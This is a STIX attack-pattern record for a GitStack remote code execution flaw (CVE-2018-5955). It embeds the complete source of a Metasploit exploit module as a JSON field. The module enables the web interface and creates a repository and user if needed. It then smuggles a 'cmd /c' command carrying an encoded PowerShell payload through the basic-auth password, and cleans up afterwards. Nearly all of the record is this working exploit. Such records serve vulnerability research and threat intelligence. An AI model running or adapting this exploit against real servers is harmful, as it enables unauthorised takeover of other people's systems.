{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3d1231c-1d3a-4648-a03d-a873e86d55ce",
    "created": "2024-08-14T16:52:05.946229Z",
    "modified": "2024-08-14T16:52:05.946232Z",
    "name": "GitStack Unsanitized Argument RCE",
    "description": " This module exploits a remote code execution vulnerability that exists in GitStack through v2.3.10, caused by an unsanitized argument being passed to an exec function call. This module has been tested on GitStack v2.3.10.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/gitstack_rce.rb",
            "external_id": "gitstack_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-5955"
        },
        {
            "source_name": "reference",
            "url": "https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GitStack Unsanitized Argument RCE',\n      'Description'    => %q{\n        This module exploits a remote code execution vulnerability that\n        exists in GitStack through v2.3.10, caused by an unsanitized argument\n        being passed to an exec function call. This module has been tested\n        on GitStack v2.3.10.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Kacper Szurek',    # Vulnerability discovery and PoC\n          'Jacob Robles'      # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-5955'],\n          ['EDB', '43777'],\n          ['EDB', '44044'],\n          ['URL', 'https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        => [['Automatic', {}]],\n      'Privileged'     => true,\n      'DisclosureDate' => '2018-01-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def check_web\n    begin\n      res = send_request_cgi({\n        'uri'     =>  '/rest/settings/general/webinterface/',\n        'method'  => 'GET'\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n\n    if res && res.code == 200\n      if res.body =~ /true/\n        vprint_good('Web interface is enabled')\n        return true\n      else\n        vprint_error('Web interface is disabled')\n        return false\n      end\n    else\n      print_error('Unable to determine status of web interface')\n      return nil\n    end\n  end\n\n  def check_repos\n    begin\n      res = send_request_cgi({\n        'uri'     =>  '/rest/repository/',\n        'method'  =>  'GET',\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      begin\n        mylist = res.get_json_document\n      rescue JSON::ParserError => e\n        print_error(\"Failed: #{e.class} - #{e.message}\")\n        return nil\n      end\n\n      if mylist.length == 0\n        vprint_error('No repositories found')\n        return false\n      else\n        vprint_good('Repositories found')\n        return mylist\n      end\n    else\n      print_error('Unable to determine available repositories')\n      return nil\n    end\n  end\n\n  def update_web(web)\n    data = {'enabled' => web}\n    begin\n      res = send_request_cgi({\n        'uri'     =>  '/rest/settings/general/webinterface/',\n        'method'  =>  'PUT',\n        'data'    =>  data.to_json\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      vprint_good(\"#{res.body}\")\n    end\n  end\n\n  def create_repo\n    repo = Rex::Text.rand_text_alpha(5)\n    c_token = Rex::Text.rand_text_alpha(5)\n    begin\n      res = send_request_cgi({\n        'uri'       =>  '/rest/repository/',\n        'method'    =>  'POST',\n        'cookie'    =>  \"csrftoken=#{c_token}\",\n        'vars_post' =>  {\n          'name'                =>  repo,\n          'csrfmiddlewaretoken' =>  c_token\n        }\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      vprint_good(\"#{res.body}\")\n      return repo\n    else\n      print_status('Unable to create repository')\n      return nil\n    end\n  end\n\n  def delete_repo(repo)\n    begin\n      res = send_request_cgi({\n        'uri'     =>  \"/rest/repository/#{repo}/\",\n        'method'  =>  'DELETE'\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n\n    if res && res.code == 200\n      vprint_good(\"#{res.body}\")\n    else\n      print_status('Failed to delete repository')\n    end\n  end\n\n  def create_user\n    user = Rex::Text.rand_text_alpha(5)\n    pass = user\n    begin\n      res = send_request_cgi({\n        'uri'       => '/rest/user/',\n        'method'    =>  'POST',\n        'vars_post' =>  {\n          'username'  =>  user,\n          'password'  =>  pass\n        }\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      vprint_good(\"Created user: #{user}\")\n      return user\n    else\n      print_error(\"Failed to create user\")\n      return nil\n    end\n  end\n\n  def delete_user(user)\n    begin\n      res = send_request_cgi({\n        'uri'     =>  \"/rest/user/#{user}/\",\n        'method'  =>  'DELETE'\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      vprint_good(\"#{res.body}\")\n    else\n      print_status('Delete user unsuccessful')\n    end\n  end\n\n  def mod_user(repo, user, method)\n    begin\n      res = send_request_cgi({\n        'uri'     =>  \"/rest/repository/#{repo}/user/#{user}/\",\n        'method'  =>  method\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      vprint_good(\"#{res.body}\")\n    else\n      print_status('Unable to add/remove user from repo')\n    end\n  end\n\n  def repo_users(repo)\n    begin\n      res = send_request_cgi({\n        'uri'     =>  \"/rest/repository/#{repo}/user/\",\n        'method'  =>  'GET'\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n    if res && res.code == 200\n      begin\n        users = res.get_json_document\n        users -= ['everyone']\n      rescue JSON::ParserError => e\n        print_error(\"Failed: #{e.class} - #{e.message}\")\n        users = nil\n      end\n    else\n      return nil\n    end\n    return users\n  end\n\n  def run_exploit(repo, user, cmd)\n    begin\n      res = send_request_cgi({\n        'uri'           =>  '/web/index.php',\n        'method'        =>  'GET',\n        'authorization' =>  basic_auth(user, \"#{Rex::Text.rand_text_alpha(1)} && cmd /c #{cmd}\"),\n        'vars_get'      =>  {\n          'p' =>  \"#{repo}.git\",\n          'a' =>  'summary'\n        }\n      })\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      print_error(\"Failed: #{e.class} - #{e.message}\")\n    end\n  end\n\n  def exploit\n    command = cmd_psh_payload(\n      payload.encoded,\n      payload_instance.arch.first,\n      { :remove_comspec => true, :encode_final_payload => true }\n    )\n    fail_with(Failure::PayloadFailed, \"Payload exceeds space left in exec call\") if command.length > 6110\n\n    web = check_web\n    repos = check_repos\n\n    if web.nil? || repos.nil?\n      return\n    end\n\n    unless web\n      update_web(!web)\n      # Wait for interface\n      sleep 8\n    end\n\n    if repos\n      pwn_repo = repos[0]['name']\n    else\n      pwn_repo = create_repo\n    end\n\n    r_users = repo_users(pwn_repo)\n    if r_users.present?\n      pwn_user = r_users[0]\n      run_exploit(pwn_repo, pwn_user, command)\n    else\n      pwn_user = create_user\n      if pwn_user\n        mod_user(pwn_repo, pwn_user, 'POST')\n        run_exploit(pwn_repo, pwn_user, command)\n        mod_user(pwn_repo, pwn_user, 'DELETE')\n        delete_user(pwn_user)\n      end\n    end\n\n    unless web\n      update_web(web)\n    end\n\n    unless repos\n      delete_repo(pwn_repo)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-01-15",
    "x_mitre_platforms": [
        "win'"
    ]
}